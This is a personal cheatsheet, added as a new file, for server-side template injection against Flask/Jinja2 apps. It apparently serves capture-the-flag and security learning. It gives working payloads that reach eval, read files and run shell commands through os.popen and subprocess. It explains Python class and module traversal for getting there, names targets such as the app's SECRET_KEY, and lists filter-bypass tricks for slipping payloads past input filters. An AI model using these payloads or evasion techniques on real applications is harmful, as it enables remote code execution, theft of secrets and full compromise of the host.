@@ -1,0 +1,178 @@
+personal server-side-template-injection (ssti) cheatsheet. just flask/jinja2/python atm, but maybe I'll add more at some point
+
+####quick cheatsheet
+g.pop.__globals__.__builtins__.eval(request.data)
+g.pop.__globals__['__builtins__']['eval'](request.data)
+g.pop.__globals__.__builtins__.open('file').read()
+g.pop.__globals__.['__builtins__']['open']('file').read()
+g.pop.__globals__.sys.modules.os.popen('ls').read()
+g.pop.__globals__['sys'].modules['os'].popen('ls').read()
+g.pop.__globals__.__builtins__.__import__('os').popen('ls').read()
+g.pop.__globals__.['__builtins__']['__import__']('os').popen('ls').read()
+''.__class__.__base__.__subclasses__()[<index of subprocess.Popen>]('ls',shell=True,stdout=-1).communicate()
+''.__class__.__base__.__subclasses__()[<index of warnings.catch_warnings>].__init__.__globals__['sys'].modules['os'].popen('ls').read()
+
+####explaining ssti
+basic idea is that if we can eval an arbitrary python statement, we can pwn the whole app/system. python is awful wrt data encapsulation and you can traverse the inheritance heirarchy to do whatever you want as long as the module you want to use is loaded in somewhere and you know how to get to it.
+flask uses jinja2 templates and usually you'll see render_template_string somewhere. in jinja2 templates, anything between {{}} will be evaluated as an arbitrary python statement (with the expectation that it returns a string) and the result is "rendered" or basically substituted in place in the string
+if we control what is passed into render_template_string, we can pwn the app/system
+
+####explaining inheritance/module traversal
+everything in python is an object of some kind and has properties with no data encapsulation or "private"
+often there are several built-in/hidden/system properties called "magic methods" that provide the under-the-hood stuff like a reference to it's class type, a reference to it's base type, globals in it's context, loaded modules in it's context, etc.
+by traversing these, we can get access to pretty much anything loaded in the app
+for example, an object of type str, "foo", has a property __class__ which is a reference to the str type.  The str type has a property __base__ which is a reference to the object type (the base type of the whole inheritance heirarchy). the object class then has a property __subclasses__ which is a function that returns a list of every class that inherits from object. and from there we can get pretty much anywhere (''.__class__.__base__.__subclasses__())
+from that list of subclasses, a pretty standard entry is warnings.catch_warnings. from a fresh python3 interactive shell it is at index 139 (...__subclasses__[139])
+this class has a constructor, which in python is always __init__.  remember how I said everything in python is an object? that includes functions! so __init__ also has (potentially) useful properties.
+In particular, many constructors will have a __globals__ property which is a dictionary of every global variable in the scope of that class.
+one of the many things that tends to show up in these global lists are references to loaded modules in the scope of that class.  as it happens, warnings.catch_warnings has the sys module loaded (this is actually why we chose that class in particular). so __globals__['sys']
+and yes, modules also have properties! in particular, we have the .modules property which is just a dictionary of modules that that module uses. sys relies on the os module, so now we can pivot there. __globals__['sys'].modules['os']
+from the os module, we've essentially pwned the system that the app is running on.  we can read and write arbitary files (open('file','rb').read()) or even execute arbitrary commands on the host machine (popen('ls').read()). and arbitary commands means anything from reading/writing files, to opening up reverse shells.
+in summary, that final traversal:
+''.__class__.__base__.__subclasses__()[139].__init__.__globals__['sys'].modules['os'].popen('whoami').read()
+
+####getting info
+the expression that gets evaluated in {{}} is substituted into the overall template string. this means our expression has to evaluate out to a string. as it turns out, though, this is pretty much always the case in python
+many objects either directly implement __str__() or at least will print some basic information about the object like it's class
+#try evaluating an object directly
+keep an eye out for
+<'class' objectname>
+<class 'name'>
+<function 'name'>
+<built-in function 'name'>
+<method 'name' of 'classname' objectname>
+<built-in method 'name' of classname object>
+<method-wrapper 'name' of classname object>
+<unbound method 'name' classname>
+<bound method 'name' of <classname objectname>>
+<slot wrapper 'name' of 'classname' objectname>
+<module 'name'>
+plus many collection types will print their contents
+#help,dict,dir
+the built-in function dir() will create a list of all of an objects properties
+this is by far the most useful way to figure out some specific inheritance/module traversal
+the built-in function dict() will create a dictionary from an iterable
+if you're trying to get info about an iterable that doesn't print it's contents when stringified, you can pass it to dict() to effectively convert it into a dictionary (which will print it's contents as most built-in collections do)
+the built-in function help() sometimes gives useful info about an object and it's properties, though honestly it usually doesn't
+#__dir__
+sometimes dir() isn't available or is missing some information. sometimes __dir__ can work as a replacement or can return more properties than dir()
+every object/class/etc has a .__dir__ method
+many objects have a custom defined version (including '',[],and (1)) which will be a built-in method, but some class types will use the default <method '__dir__' of 'object' objects>
+this default can also be accessed through object.__dir__, but I've seen it be overwritten with a useless built-in method before
+custom versions generally are called without arguments and are equivalent to dir()
+the default version takes an argument and is similar to calling dir() on that argument, but generally will return even more properties
+#searching a large collection
+for lists, you can use slicing to roughly search for the index of something
+i.e. __subclasses__()[150:] then __subclasses__()[100:] then __subclasses__()[135:], etc.
+for dictionaries with large blocks of text that make it impossible to read (like __globals__), you can use [*(path_to_dict)] to get a list of keys in the dict
+
+####traversal starting points
+#application
+often the most useful and shortest traversals start with something application specific
+e.g. value_in_scope_or_format_string_param.__init__.__globals__
+try checking what's available under self.
+a lot of the magic methods of our execution context object aren't available as "global scope" variables and have to be invoked through self.
+e.g. self.__init__
+#flask/jinja2
+it's also worth looking out for flask/jinja2 specific starting points
+config (flask configuration object)
+request (flask request object)
+session (flask session object)
+g (flask app globals)
+urlfor (flask function that is accessible from the template eval scope)
+g.pop is one character shorter if you're looking to start from a function
+#primitives
+many built-in "primitive" types are easy and consistent starting points
+'' (str)
+[] (list)
+(1) (int)
+you can get to object from all three of these with .__class__.__base__
+
+####where to go next
+an important note is that sometimes one of these properties is available, but doesn't show up in dir(). no idea why, so you should use __dir__ to look for it or just directly test for the useful ones
+#from anything
+check for anything directly useful;i.e. secret variables, useful functions, etc.
+.__class__ <class "name"> gives a class object
+#from an object
+all objects have a .__init__ (method-wrapper or bound method) which represents the constructor
+#from a class
+.__init__ (function, unbound method, or slot wrapper) which represents the constructor
+.__base__ <class "baseclass"> which gets you to the base class
+.__bases__ is a tuple of base classes.  for use in multiple inheritance
+.mro <built-in method mro> which, when called, returns a list of classes starting with the current class and iterating down the class heirarchy down to object
+.__mro__ is an ordered tuple of classes in the same order as .mro
+.__subclasses__ <built-in method __subclasses__> gives a list of classes which inherit from this class. it only gives directly inherited classes
+#from a function/method
+.__globals__ is automatically added to a function if it was imported from a module. it is a dictionary containing everything at global scope of that module. it may not exist, but if it does, it generally opens up a lot of possibilities. keep in mind that it's the scope of where that function is defined, so a bound method will have access to where the object the method is bound to was instantiated while a class function will have access to where the class was defined
+#__globals__
+anything directly useful from this module's global context?
+any other modules imported at this context that we can pivot from? (sys can pivot to os)
+.__builtins__ <module 'builtins'> or sometimes <class dict>  gives us all of our builtins that are missing from the jinja2/flask execution context
+#__builtins__
+all of the builtins that were missing are here (i.e. dir,map,open,eval,etc.)
+__import__ <built-in function __import__> which, when called with a string name of a module, returns that module. this is obviously a really powerful pivot tool
+globals <built-in function globals> can be used to get the globals from the runtime context (rather than the module __globals__ was called from). despite this, it doesn't seem like we have access to everything here at the "global" scope of our template execution. it does seem to be the same as self.__init__.__globals__, though, as the '__name__' key is the same.
+#modules
+anything directly useful from this module?
+can we poivot to other modules from here?
+some modules, like sys, have a .modules dictionary of other modules to pivot to
+
+####useful destinations
+g.flag
+config['SECRET_KEY']
+open('file').read()
+os.popen('ls').read()
+subprocess.Popen('ls',shell=True,stdout=-1).communicate()
+
+####flask/jinja weird shit
+a lot of builtins are missing from the execution context. often you can't call dir,map,open,eval,globals,__import__,etc.
+list comprehension doesn't work ([i for i in list])
+generators don't work ((i for i in list))
+certain functions, classes, and objects are different from a "clean" execution state. e.g. object.__dir__ is one of those no argument versions rather than the default one
+jinja lets you access properties in dictionary notation g.pop['__globals__'] instead of g.pop.__globals__
+jinja lets you access properties with it's attr filter g.pop|attr('__globals__'), but these can be weird sometimes where you can't use [] or . after them without surrounding the whole filter expression with ()
+if you call eval, the evaluated statement will actually work as if it was in a "clean" context rather than the weird flask/jinja shit. because of this, it's convenient to just use the ssti to call eval request.data or similar and putting a more powerful payload there.
+
+####filter bypass
+sometimes you can control the contents of render_template_string, but certain things are filtered out, making traversal more difficult. there are often several ways to accomplish the same thing, though
+#alternate ways to access properties
+normal . syntax
+obj.prop
+jinja let's you use dictionary syntax
+obj['prop']
+jinja let's you use it's attr filter
+obj|attr('prop')
+python's getattr builtin
+getattr(obj,'prop')
+magic method
+obj.__getattribute__('prop')
+getting to python's getattr builtin from a type object's getattr magic method
+obj.__class__.__getattribute__(obj,'prop')
+you can call constructors with __class__
+Class.__class__(args) == Class(args)
+(1).__class__(hex_string,16) == int(hex_string,16)
+[].__class__(iterable) == list(iterable)
+#string concatenation
+all of the above methods reference the property by string.  if the property name itself is filtered, you can use string concatenation
+getattr(obj,'pr'+'op')
+and python actually will concatenate strings following each other
+getattr(obj,'pr''op')
+#other ways to represent characters or manip strings
+use a hex literal
+getattr(obj,'pr\x6fp')
+use a reverse string
+getattr(obj,'porp'[::-1])
+join iterable
+getattr(obj,''.join(['p','r','o','p']))
+chr/map clusterfuck
+getattr(obj,chr(0)[:0].join(map(chr,[112,114,111,112])))
+#hide things in other parts of the request
+request.full_path (full unicode path including query string)
+request.url (URL as IRI)
+request.args (query args as dictionary)
+request.form (POST data as dictionary)
+request.values (combined args and form dictionary)
+request.headers (headers in a dictionary-like object)
+request.user_agent (user agent header)
+request.cookies (cookie dictionary)
+request.data (request body. yes, a GET can have a body, too)
